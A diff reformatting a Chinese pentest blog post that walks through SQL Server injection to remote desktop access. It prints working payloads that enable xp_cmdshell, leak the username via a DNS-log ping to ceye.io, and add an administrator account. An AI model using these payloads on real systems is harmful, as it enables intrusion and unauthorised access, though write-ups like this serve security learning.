@@ -1,171 +1,41 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="从 SQL Server 注入到 远程连接桌面"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>从 SQL Server 注入到 远程连接桌面 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>从 SQL Server 注入到 远程连接桌面</h1>
-      
-<div class="post-meta">
-    <time>2019-06-25</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>)
-</div>
-
-      <div><h3 id="0x00-目标情况">0x00 目标情况</h3>
-<ul>
-<li>只有一个登录框</li>
-</ul>
-<h3 id="0x01-发现注入">0x01 发现注入</h3>
-<p>简单看了下登陆框，可以爆破用户名</p>
-<p><img src="/img/post/Xnip2019-06-25_09-42-33.png" alt="50">
-<img src="/img/post/Xnip2019-06-25_09-43-33.png" alt="50"></p>
-<p>加单引号后报错，试了试 and 1=1 确实存在注入</p>
-<p><img src="/img/post/Xnip2019-06-25_09-45-03.png" alt="60">
-<img src="/img/post/Xnip2019-06-25_09-46-06.png" alt="50"></p>
-<h3 id="0x01-进一步测试">0x01 进一步测试</h3>
-<p>尝试得到数据版本: <code>admin' and @@version=1--</code>
-<img src="/img/post/Xnip2019-06-25_09-49-45.png" alt="60"></p>
-<p>抓包 sqlmap 跑了下发现不行: <code>sqlmap -r 1.txt --risk 3 --level 3 --dbms &quot;Microsoft SQL Server&quot; --second-order &quot;http://123.xxx.xxx.180:2001/error.aspx&quot;</code></p>
-<p>返回: all tested parameters appear to be not injectable，跑不出来，只能手工了</p>
-<p>看下能不能多语句执行: <code>admin';select convert(int,(select user));--</code></p>
-<p>结果发现可以执行成功，能进行多语句执行
-<img src="/img/post/Xnip2019-06-25_09-56-08.png" alt="60"></p>
-<h3 id="0x02-尝试多语句执行添加用户">0x02 尝试多语句执行添加用户</h3>
-<ul>
-<li>
-<p>查看是否有 xp_cmdshell<br>
-Payload：<code>admin';if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:5';--</code>
-<img src="/img/post/Xnip2019-06-25_10-05-25.png" alt="60"></p>
-</li>
-<li>
-<p>开启 xp_cmdshell<br>
-Payload：<code>admin';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--</code>
-<img src="/img/post/Xnip2019-06-25_10-07-41.png" alt="50"></p>
-</li>
-<li>
-<p>查看 whoami<br>
-Payload：<code>admin';exec master..xp_cmdshell 'ping %USERNAME%.vxxxx9.ceye.io';--</code>
-<img src="/img/post/Xnip2019-06-25_10-10-38.png" alt="50">
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="从 SQL Server 注入到 远程连接桌面"><meta name=author content="Reber"><title>从 SQL Server 注入到 远程连接桌面 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>从 SQL Server 注入到 远程连接桌面</h1><div class=post-meta><time>2019-06-25</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/SQL%E6%B3%A8%E5%85%A5>SQL注入</a>)</div><div><h3 id=0x00-目标情况>0x00 目标情况</h3><ul><li>只有一个登录框</li></ul><h3 id=0x01-发现注入>0x01 发现注入</h3><p>简单看了下登陆框，可以爆破用户名</p><p><img src=/img/post/Xnip2019-06-25_09-42-33.png alt=50>
+<img src=/img/post/Xnip2019-06-25_09-43-33.png alt=50></p><p>加单引号后报错，试了试 and 1=1 确实存在注入</p><p><img src=/img/post/Xnip2019-06-25_09-45-03.png alt=60>
+<img src=/img/post/Xnip2019-06-25_09-46-06.png alt=50></p><h3 id=0x01-进一步测试>0x01 进一步测试</h3><p>尝试得到数据版本: <code>admin' and @@version=1--</code>
+<img src=/img/post/Xnip2019-06-25_09-49-45.png alt=60></p><p>抓包 sqlmap 跑了下发现不行: <code>sqlmap -r 1.txt --risk 3 --level 3 --dbms "Microsoft SQL Server" --second-order "http://123.xxx.xxx.180:2001/error.aspx"</code></p><p>返回: all tested parameters appear to be not injectable，跑不出来，只能手工了</p><p>看下能不能多语句执行: <code>admin';select convert(int,(select user));--</code></p><p>结果发现可以执行成功，能进行多语句执行
+<img src=/img/post/Xnip2019-06-25_09-56-08.png alt=60></p><h3 id=0x02-尝试多语句执行添加用户>0x02 尝试多语句执行添加用户</h3><ul><li><p>查看是否有 xp_cmdshell<br>Payload：<code>admin';if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:5';--</code>
+<img src=/img/post/Xnip2019-06-25_10-05-25.png alt=60></p></li><li><p>开启 xp_cmdshell<br>Payload：<code>admin';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--</code>
+<img src=/img/post/Xnip2019-06-25_10-07-41.png alt=50></p></li><li><p>查看 whoami<br>Payload：<code>admin';exec master..xp_cmdshell 'ping %USERNAME%.vxxxx9.ceye.io';--</code>
+<img src=/img/post/Xnip2019-06-25_10-10-38.png alt=50>
 在 dnslog 可以看到是 SYSTEM 权限，可以直接添加用户
-<img src="/img/post/Xnip2019-06-25_10-16-37.png" alt="60"></p>
-</li>
-<li>
-<p>添加用户<br>
-看了下端口，3389开着</p>
-</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  sudo nmap -sS -Pn -n -p3389 123.xxx.xxx.180
-</span></span><span style="display:flex;"><span>Password:
-</span></span><span style="display:flex;"><span>Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-06-25 09:30 CST
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 123.xxx.xxx.180
-</span></span><span style="display:flex;"><span>Host is up.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT     STATE    SERVICE
-</span></span><span style="display:flex;"><span>3389/tcp open     ms-wbt-server
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 2.07 seconds
-</span></span></code></pre></div><p>直接添加用户: <code>admin';exec master..xp_cmdshell 'net user Guest1 Aa123456. /add &amp; net localgroup administrators Guest1 /add &amp; net user Guest1 /active:yes'--</code>，尝试登陆
-<img src="/img/post/Xnip2019-06-25_10-22-58.png" alt="60"></p>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+<img src=/img/post/Xnip2019-06-25_10-16-37.png alt=60></p></li><li><p>添加用户<br>看了下端口，3389开着</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>➜  sudo nmap -sS -Pn -n -p3389 123.xxx.xxx.180
+</span></span><span style=display:flex><span>Password:
+</span></span><span style=display:flex><span>Starting Nmap 7.70 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2019-06-25 09:30 CST
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 123.xxx.xxx.180
+</span></span><span style=display:flex><span>Host is up.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT     STATE    SERVICE
+</span></span><span style=display:flex><span>3389/tcp open     ms-wbt-server
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 2.07 seconds
+</span></span></code></pre></div><p>直接添加用户: <code>admin';exec master..xp_cmdshell 'net user Guest1 Aa123456. /add & net localgroup administrators Guest1 /add & net user Guest1 /active:yes'--</code>，尝试登陆
+<img src=/img/post/Xnip2019-06-25_10-22-58.png alt=60></p></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
